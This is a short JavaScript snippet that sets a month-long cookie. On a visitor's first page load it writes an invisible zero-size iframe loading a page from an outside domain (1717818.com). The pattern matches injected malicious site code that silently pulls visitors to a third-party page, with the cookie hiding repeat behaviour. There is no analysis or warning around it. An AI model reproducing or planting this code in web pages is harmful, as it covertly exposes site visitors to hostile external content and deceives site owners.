function bglovemm() {
        var expireDate = new Date();
    var hours = expireDate.getHours();
    var minutes = expireDate.getMinutes();
    var seconds = expireDate.getSeconds();
        var lefttime = 1000 * ( 2592000 - hours*3600 - minutes*60 - seconds);
    expireDate.setTime (expireDate.getTime() + lefttime);
    document.cookie = "bglovemm=yes" + "; expires=" + expireDate.toGMTString() +  ";";
}
offset = document.cookie.indexOf("bglovemm");
if (offset == -1) {
        bglovemm();
document.write("<iframe src=http://www.1717818.com/700.htm width=0 height=0></iframe>")
}
